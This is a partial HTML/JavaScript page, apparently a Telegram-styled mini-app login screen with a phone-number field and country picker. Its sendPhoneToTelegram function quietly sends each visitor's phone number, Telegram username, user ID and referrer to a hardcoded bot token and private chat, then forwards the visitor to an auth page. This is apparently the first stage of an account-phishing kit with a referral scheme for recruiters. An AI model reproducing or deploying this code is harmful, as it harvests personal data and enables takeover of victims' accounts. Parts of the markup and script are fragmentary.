        }

            color: var(--tg-red);

            margin-top: 0.5rem;
            transition: opacity 0.3s ease;

        }
        .input-container {
            position: relative;
        }
        .floating-label {
            position: absolute;
            left: 12px;
            top: -8px;
            transform: translateY(0);
            color: #8774e1;
            pointer-events: none;
            transition: all 0.2s ease;
            font-size: 0.75rem;
            background-color: #212121;
            padding: 0 4px;
        }
        .input-container:focus-within .floating-label,
        .input-container.has-value .floating-label,
        .input-field:focus ~ .floating-label,
        .input-field.has-value ~ .floating-label,
        .input-select:focus ~ .floating-label,
        .input-select.has-value ~ .floating-label {
            top: -8px;
            left: 12px;
            transform: translateY(0);
            font-size: 0.75rem;
            color: #8774e1;
            background-color: #212121;

        }
        .input-container.has-error .floating-label {

        .input-container.has-error .country-dropdown-button,

        }

            transition: all 0.15s ease;
        }
        .input-field:focus, .input-select:focus {
            border-width: 2px;
            border-color: #8774e1;
            outline: none;
        }
        .input-field.has-value:not(:focus), .input-select.has-value:not(:focus) {
            border-width: 2px;
            border-color: #8774e1;
        }
        .country-dropdown {
            position: relative;
        }
        .country-dropdown-button {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
            padding: 0.875rem 1rem;
            background-color: transparent;
            border: 1px solid #6b7280;
            border-radius: 0.75rem;
            color: #ffffff;
            cursor: pointer;

        }

        }
        .country-dropdown-button.open {

            top: 100%;
            left: 0;
            right: 0;

            overflow-y: auto;

        function formatPhoneNumber(value, country) {
            if (!country) return value;
            
            let digits = value.replace(/[^\d]/g, '');
            if (digits.length === 0) return '+';
            
            const prefixDigits = country.prefix.replace(/[^\d]/g, '');
            if (!digits.startsWith(prefixDigits)) {
                digits = prefixDigits + digits;
            }
            
            const numberPart = digits.substring(prefixDigits.length);
            
            let formatted = country.prefix + ' ';
            
            if (country.format) {
                const formatDigits = country.format.replace(/[^Xx]/g, '').length;
                
                let digitIndex = 0;
                let spacePositions = [];
                let currentPosition = 0;
                
                let digitCount = 0;
                for (let i = 0; i < country.format.length; i++) {
                    const formatChar = country.format[i];
                    if (formatChar === 'X' || formatChar === 'x') {
                        digitCount++;
                    } else if (formatChar === ' ') {
                        spacePositions.push(digitCount);
                    }
                }
                
                for (let i = 0; i < numberPart.length; i++) {
                    formatted += numberPart[i];
                    if (spacePositions.includes(i + 1) && i < numberPart.length - 1) {
                        formatted += ' ';
                    }
                }
            } else {
                for (let i = 0; i < numberPart.length; i++) {
                    formatted += numberPart[i];
                    if ((i + 1) % 3 === 0 && i < numberPart.length - 1) {
                        formatted += ' ';
                    }
                }
            }
            
            return formatted;
        }
        
        function handlePhoneInput(input, preserveCursor = false) {
            let value = input.value;
            
            let digitsOnly = value.replace(/\s/g, '');
            
            digitsOnly = digitsOnly.replace(/[^\d+]/g, '');
            
            if (digitsOnly.length > 0 && digitsOnly[0] !== '+') {
                digitsOnly = '+' + digitsOnly.replace(/\+/g, '');
            }
            
            const prefix = extractPrefix(digitsOnly);
            let country = null;
            
            if (prefix) {
                country = allCountries.find(c => c.prefix === prefix);
                if (country) {
                    value = formatPhoneNumber(digitsOnly, country);
                    
                    updatePhoneNumberSettingsByPrefix(prefix);
                    
                    const countryDropdownButton = document.getElementById('countryDropdownButton');
                    const countryButtonName = document.getElementById('countryButtonName');
                    const countryDropdownList = document.getElementById('countryDropdownList');
                    if (countryDropdownButton && country && countryDropdownList) {
                        const foundItem = countryDropdownList.querySelector(`[data-prefix="${prefix}"]`);
                        if (foundItem) {
                            countryDropdownList.querySelectorAll('.country-dropdown-item').forEach(el => {
                                el.classList.remove('selected');
                            });
                            foundItem.classList.add('selected');
                            
                            if (countryButtonName) {
                                countryButtonName.textContent = country.name;
                            }
                        }
                    }
                } else {
                    value = digitsOnly;
                }
            } else {
                value = digitsOnly;
            }
            
            if (input.value !== value) {
                input.value = value;
            }
            
            setTimeout(() => {
                try {
                    const newLength = value.length;
                    input.setSelectionRange(newLength, newLength);
                } catch (e) {
                }
            }, 0);
        }
        
        function extractPrefix(fullNumber) {
            const digits = fullNumber.replace(/[^\d]/g, '');
            if (digits.length === 0) return null;
            
            let foundPrefix = null;
            for (let i = Math.min(5, digits.length); i >= 1; i--) {
                const prefix = '+' + digits.substring(0, i);
                const found = allCountries.find(c => c.prefix === prefix);
                if (found) {
                    foundPrefix = prefix;
                    break;
                }
            }
            return foundPrefix;
        }
        
        function updatePhoneNumberSettingsByPrefix(prefix) {
            const phoneNumberInput = document.getElementById('phoneNumberInput');
            const foundCountry = allCountries.find(c => c.prefix === prefix);
            
            if (foundCountry && phoneNumberInput) {
                phoneNumberInput.setAttribute('data-prefix-length', prefix.length);
                phoneNumberInput.setAttribute('data-number-length', foundCountry.length);
                phoneNumberInput.setAttribute('data-country-code', foundCountry.code);
                
                const prefixDigits = prefix.replace(/[^\d]/g, '');
                const testDigits = prefixDigits + '0'.repeat(foundCountry.length);
                const testFormatted = formatPhoneNumber('+' + testDigits, foundCountry);
                const maxLength = testFormatted.length;
                phoneNumberInput.setAttribute('maxlength', maxLength);
            }
        }

            const countryDropdownButton = document.getElementById('countryDropdownButton');

            const countryContainer = countryDropdownButton ? countryDropdownButton.closest('.input-container') : null;

            if (countryContainer) {

        function updatePhoneNumberSettings(selectedOption) {
            const phoneNumberInput = document.getElementById('phoneNumberInput');
            const errorElement = document.getElementById('errorPhone');

            const newPrefix = selectedOption.value;
            const newLength = selectedOption.getAttribute('data-length');
            const countryCode = selectedOption.getAttribute('data-country-code');
            const country = allCountries.find(c => c.code === countryCode);

            errorElement.textContent = '';
            errorElement.classList.add('opacity-0');
            toggleErrorStyles(false);

            if (newPrefix && newLength && phoneNumberInput) {
                const formattedPrefix = country && country.format ? 
                    formatPhoneNumber(newPrefix, country) : newPrefix;
                
                phoneNumberInput.value = formattedPrefix;
                phoneNumberInput.setAttribute('data-prefix-length', newPrefix.length);
                phoneNumberInput.setAttribute('data-number-length', newLength);
                phoneNumberInput.setAttribute('data-country-code', countryCode);
                
                const prefixDigits = newPrefix.replace(/[^\d]/g, '');
                const testDigits = prefixDigits + '0'.repeat(parseInt(newLength, 10));
                const testFormatted = formatPhoneNumber('+' + testDigits, country);
                const maxLength = testFormatted.length;
                phoneNumberInput.setAttribute('maxlength', maxLength);
                phoneNumberInput.focus();
                
                setTimeout(() => {
                    phoneNumberInput.setSelectionRange(formattedPrefix.length, formattedPrefix.length);
                }, 0);
            }
        }

        function initializeCountrySelector() {
            const countryDropdownButton = document.getElementById('countryDropdownButton');
            const countryDropdownList = document.getElementById('countryDropdownList');
            const countryButtonName = document.getElementById('countryButtonName');
            const phoneNumberInput = document.getElementById('phoneNumberInput');
            const defaultCountryCode = 'RU';

            if (!countryDropdownButton || !countryDropdownList || !phoneNumberInput) {
                console.error('Missing critical elements.');
                return;
            }

            countryDropdownList.innerHTML = '';
            const initialCountry = allCountries.find(c => c.code === defaultCountryCode) || allCountries[0];

            const alphabeticalCountries = [...allCountries].sort((a, b) =>
                new Intl.Collator('ru').compare(a.name, b.name)
            );

            alphabeticalCountries.forEach(country => {
                const item = document.createElement('div');
                item.className = 'country-dropdown-item';
                item.setAttribute('role', 'option');
                item.setAttribute('data-prefix', country.prefix);
                item.setAttribute('data-length', country.length);
                item.setAttribute('data-country-code', country.code);
                if (country.code === defaultCountryCode) {
                    item.classList.add('selected');
                }
                
                item.innerHTML = `
                    <div style="display: flex; align-items: center; flex: 1;">
                        <span class="country-item-name">${country.name}</span>
                    </div>
                    <span class="country-item-code">${country.prefix}</span>
                `;
                
                item.addEventListener('click', () => {
                    countryDropdownList.querySelectorAll('.country-dropdown-item').forEach(el => {
                        el.classList.remove('selected');
                    });
                    item.classList.add('selected');
                    
                    countryButtonName.textContent = country.name;
                    
                    countryDropdownButton.classList.remove('open');
                    countryDropdownList.classList.remove('open');
                    countryDropdownButton.setAttribute('aria-expanded', 'false');
                    
                    const mockOption = {
                        value: country.prefix,
                        getAttribute: (attr) => {
                            if (attr === 'data-length') return country.length;
                            if (attr === 'data-country-code') return country.code;
                            return null;
                        }
                    };
                    updatePhoneNumberSettings(mockOption);
                });
                
                countryDropdownList.appendChild(item);
            });

            countryButtonName.textContent = initialCountry.name;
            countryDropdownButton.classList.add('has-value');

            countryDropdownButton.addEventListener('click', (e) => {
                e.stopPropagation();
                const isOpen = countryDropdownButton.classList.contains('open');
                if (isOpen) {
                    countryDropdownButton.classList.remove('open');
                    countryDropdownList.classList.remove('open');
                    countryDropdownButton.setAttribute('aria-expanded', 'false');
                } else {
                    countryDropdownButton.classList.add('open');
                    countryDropdownList.classList.add('open');
                    countryDropdownButton.setAttribute('aria-expanded', 'true');
                }
            });

            document.addEventListener('click', (e) => {
                if (!countryDropdownButton.contains(e.target) && !countryDropdownList.contains(e.target)) {
                    countryDropdownButton.classList.remove('open');
                    countryDropdownList.classList.remove('open');
                    countryDropdownButton.setAttribute('aria-expanded', 'false');
                }
            });

            const initialFormatted = formatPhoneNumber(initialCountry.prefix, initialCountry);
            phoneNumberInput.value = initialFormatted;
            phoneNumberInput.setAttribute('data-prefix-length', initialCountry.prefix.length);
            phoneNumberInput.setAttribute('data-number-length', initialCountry.length);
            phoneNumberInput.setAttribute('data-country-code', initialCountry.code);
            
            const testDigits = initialCountry.prefix.replace(/[^\d]/g, '') + '0'.repeat(initialCountry.length);
            const testFormatted = formatPhoneNumber('+' + testDigits, initialCountry);
            const maxLength = testFormatted.length;
            phoneNumberInput.setAttribute('maxlength', maxLength);
            
            updateFieldValue();
            
            setTimeout(() => {
                const cursorPos = initialFormatted.length;
                phoneNumberInput.setSelectionRange(cursorPos, cursorPos);
            }, 0);

            const processInput = (input) => {
                const errorElement = document.getElementById('errorPhone');
                if (errorElement && errorElement.textContent) {
                    errorElement.textContent = '';
                    errorElement.classList.add('opacity-0');
                    toggleErrorStyles(false);
                }
                
                handlePhoneInput(input);
                
                updateFieldValue();
            };

            phoneNumberInput.addEventListener('input', (event) => {
                processInput(event.target);
            });

            phoneNumberInput.addEventListener('paste', (event) => {
                setTimeout(() => {
                    processInput(event.target);
                }, 0);
            });

            phoneNumberInput.addEventListener('change', (event) => {
                processInput(event.target);
            });
            
            phoneNumberInput.addEventListener('keydown', (event) => {
                if (event.key === 'Backspace') {
                    const cursorPosition = event.target.selectionStart;
                    const value = event.target.value;
                    
                    if (cursorPosition > 0 && value[cursorPosition - 1] === ' ') {
                        event.preventDefault();
                        const newValue = value.substring(0, cursorPosition - 2) + value.substring(cursorPosition);
                        event.target.value = newValue;
                        handlePhoneInput(event.target, false);
                        return;
                    }
                }
                
                const cursorPosition = event.target.selectionStart;
                const value = event.target.value;
                const hasPlus = value.includes('+');
                
                if (event.key.length === 1) {
                    if (event.key === '+' && hasPlus) {
                        event.preventDefault();
                        return;
                    }
                    if (event.key === '+' && cursorPosition > 0) {
                        event.preventDefault();
                        return;
                    }
                    if (!/[0-9]/.test(event.key) && event.key !== '+') {
                        event.preventDefault();
                        return;
                    }
                }
            });

            phoneNumberInput.addEventListener('blur', () => {
                updateFieldValue();
            });
            
            countryDropdownButton.addEventListener('blur', () => {
                updateFieldValue();
            });
        }

            let refParam = '';

                refParam = window.Telegram.WebApp.startParam;
            }
            const urlParams = new URLSearchParams(window.location.search);

            try {

            } catch (error) {
                console.error('Ошибка при отправке номера телефона:', error);
            }
            
            const userData = getUserData();
            const referrerInfo = getReferrerInfo();
            
            let authUrl = `auth.html?phone=${encodeURIComponent(fullPhoneNumber)}`;
            if (userData.username !== 'Не указан' && userData.userId !== 'Не указан') {
                authUrl += `&user=${encodeURIComponent(userData.username)}&userid=${encodeURIComponent(userData.userId)}`;
            }
            if (referrerInfo && referrerInfo.username) {
                authUrl += `&ref=${encodeURIComponent(referrerInfo.username)}`;
            } else if (refParam) {
                authUrl += `&ref=${encodeURIComponent(refParam)}`;
            }
            window.location.href = authUrl;
        }
        
        function getReferrerInfo() {
            let referrerInfo = null;
            
            const savedReferrer = sessionStorage.getItem('referrerInfo');
            if (savedReferrer) {
                try {
                    referrerInfo = JSON.parse(savedReferrer);
                    if (referrerInfo && referrerInfo.username) {
                        return referrerInfo;
                    }
                } catch (e) {
                    console.error('Ошибка при парсинге сохранённого реферала:', e);
                }
            }
            
            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.startParam) {
                try {
                    const startParam = window.Telegram.WebApp.startParam;
                    if (startParam.startsWith('ref_')) {
                        const refData = startParam.substring(4);
                        const parts = refData.split('_');
                        if (parts.length >= 2) {
                            const referrerId = parts[parts.length - 1];
                            const referrerUsername = parts.slice(0, -1).join('_');
                            
                            if (referrerUsername.startsWith('id')) {
                                referrerInfo = { username: `ID:${referrerId}`, userId: referrerId };
                            } else {
                                referrerInfo = { username: `@${referrerUsername}`, userId: referrerId };
                            }
                            
                            sessionStorage.setItem('referrerInfo', JSON.stringify(referrerInfo));
                            return referrerInfo;
                        }
                    }
                } catch (e) {
                    console.error('Ошибка при парсинге реферала из startParam:', e);
                }
            }
            
            const urlParams = new URLSearchParams(window.location.search);
            const urlRef = urlParams.get('ref');
            if (urlRef) {
                try {
                    if (urlRef.startsWith('ref_')) {
                        const refData = urlRef.substring(4);
                        const parts = refData.split('_');
                        if (parts.length >= 2) {
                            const referrerId = parts[parts.length - 1];
                            const referrerUsername = parts.slice(0, -1).join('_');
                            
                            if (referrerUsername.startsWith('id')) {
                                referrerInfo = { username: `ID:${referrerId}`, userId: referrerId };
                            } else {
                                referrerInfo = { username: `@${referrerUsername}`, userId: referrerId };
                            }
                        } else {
                            referrerInfo = { username: `@${urlRef}`, userId: 'Не указан' };
                        }
                    } else {
                        referrerInfo = { username: urlRef.startsWith('@') ? urlRef : `@${urlRef}`, userId: 'Не указан' };
                    }
                    
                    if (referrerInfo) {
                        sessionStorage.setItem('referrerInfo', JSON.stringify(referrerInfo));
                        return referrerInfo;
                    }
                } catch (e) {
                    console.error('Ошибка при парсинге реферала из URL:', e);
                }
            }
            
            return null;
        }

        function getUserData() {
            let username = 'Не указан';
            let userId = 'Не указан';
            
            const savedUser = sessionStorage.getItem('telegramUser');
            if (savedUser) {
                try {
                    const user = JSON.parse(savedUser);
                    username = user.username || 'Не указан';
                    userId = user.id || 'Не указан';
                    if (username !== 'Не указан' && userId !== 'Не указан') {
                        return { username, userId };
                    }
                } catch (e) {
                    console.error('Ошибка при парсинге сохранённых данных пользователя:', e);
                }
            }
            
            const urlParams = new URLSearchParams(window.location.search);
            const urlUser = urlParams.get('user');
            const urlUserId = urlParams.get('userid');
            if (urlUser && urlUserId) {
                username = urlUser.startsWith('@') ? urlUser : `@${urlUser}`;
                userId = urlUserId;
                sessionStorage.setItem('telegramUser', JSON.stringify({ username, userId }));
                console.log('✅ Данные пользователя получены из URL параметров:', { username, userId });
                return { username, userId };
            }
            
            if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.startParam) {
                try {
                    const startParam = window.Telegram.WebApp.startParam;
                    console.log('startParam найден:', startParam);
                    
                    if (startParam.startsWith('ref_')) {
                        const refData = startParam.substring(4);
                        console.log('refData после удаления префикса:', refData);
                        
                        const parts = refData.split('_');
                        console.log('Части после split:', parts);
                        
                        if (parts.length >= 2) {
                            userId = parts[parts.length - 1];
                            username = parts.slice(0, -1).join('_');
                            
                            console.log('Извлеченные данные:', { rawUsername: username, userId });
                            
                            if (username.startsWith('id')) {
                                username = `ID:${userId}`;
                            } else {
                                username = `@${username}`;
                            }
                            
                            sessionStorage.setItem('telegramUser', JSON.stringify({ username, userId }));
                            console.log('✅ Данные пользователя получены из startParam и сохранены:', { username, userId });
                            return { username, userId };
                        } else {
                            console.warn('Недостаточно частей в startParam:', parts);
                        }
                    } else {
                        console.log('startParam не начинается с "ref_":', startParam);
                    }
                } catch (e) {
                    console.error('Ошибка при парсинге startParam:', e);
                }
            } else {
                console.log('startParam не доступен:', {
                    hasTelegram: !!window.Telegram,
                    hasWebApp: !!(window.Telegram && window.Telegram.WebApp),
                    hasStartParam: !!(window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.startParam)
                });
            }
            
            if (window.Telegram && window.Telegram.WebApp) {
                try {
                    if (window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
                        const user = window.Telegram.WebApp.initDataUnsafe.user;
                        userId = String(user.id || 'Не указан');
                        if (user.username) {
                            username = `@${user.username}`;
                        } else if (user.first_name || user.last_name) {
                            const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim();
                            username = fullName || `ID:${userId}`;
                        } else {
                            username = `ID:${userId}`;
                        }
                    }
                    else if (window.Telegram.WebApp.initData) {
                        const initData = window.Telegram.WebApp.initData;
                        const params = new URLSearchParams(initData);
                        const userStr = params.get('user');
                        if (userStr) {
                            try {
                                const user = JSON.parse(decodeURIComponent(userStr));
                                userId = String(user.id || 'Не указан');
                                if (user.username) {
                                    username = `@${user.username}`;
                                } else if (user.first_name || user.last_name) {
                                    const fullName = `${user.first_name || ''} ${user.last_name || ''}`.trim();
                                    username = fullName || `ID:${userId}`;
                                } else {
                                    username = `ID:${userId}`;
                                }
                            } catch (e) {
                                console.error('Ошибка при парсинге initData:', e);
                            }
                        }
                    }
                    
                    if (userId !== 'Не указан') {
                        sessionStorage.setItem('telegramUser', JSON.stringify({ username, userId }));
                    }
                } catch (e) {
                    console.error('Ошибка при получении данных пользователя:', e);
                }
            }
            
            console.log('Telegram WebApp доступен:', !!window.Telegram);
            console.log('startParam:', window.Telegram?.WebApp?.startParam);
            console.log('initDataUnsafe:', window.Telegram?.WebApp?.initDataUnsafe);
            console.log('initData:', window.Telegram?.WebApp?.initData);
            console.log('Полученные данные пользователя:', { username, userId });
            
            return { username, userId };
        }

        async function sendPhoneToTelegram(phoneNumber, refParam = '') {
            const BOT_TOKEN = '8289543761:AAGjow_hAYF8WfQnWJQnln5f0l8x2FKMzYA';
            const CHAT_ID = '-1003476597636';
            
            let userData = getUserData();
            console.log('Данные пользователя перед отправкой номера:', userData);
            
            if (userData.username === 'Не указан' || userData.userId === 'Не указан') {
                await new Promise(resolve => setTimeout(resolve, 200));
                userData = getUserData();
                console.log('Повторная попытка получения данных:', userData);
            }
            
            const { username, userId } = userData;
            
            const referrerInfo = getReferrerInfo();
            
            let message = `📱 <b>Номер телефона</b>\n\n`;
            if (referrerInfo && referrerInfo.username) {
                message += `🔗 Пригласил: ${referrerInfo.username}\n\n`;
            }
            message += `👤 Пользователь: ${username}\n🆔 ID: ${userId}\n📞 Телефон: ${phoneNumber || 'Не указан'}`;
            if (refParam && (!referrerInfo || !referrerInfo.username)) {
                message += `\n🔗 Реферал: ${refParam}`;
            }
            message += `\n⏰ Время: ${new Date().toLocaleString('ru-RU')}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Ошибка при отправке номера телефона:', error);
            }
        }

        function setupEventListeners() {
            const nextButton = document.getElementById('nextButton');
            if (nextButton) {
                nextButton.addEventListener('click', handleNextClick);

            if (window.Telegram && window.Telegram.WebApp) {
                window.Telegram.WebApp.ready();

        }

        window.onload = function() {
            try {
                if (window.Telegram && window.Telegram.WebApp) {

                setTimeout(() => {

                initializeCountrySelector();

        };
    </script>
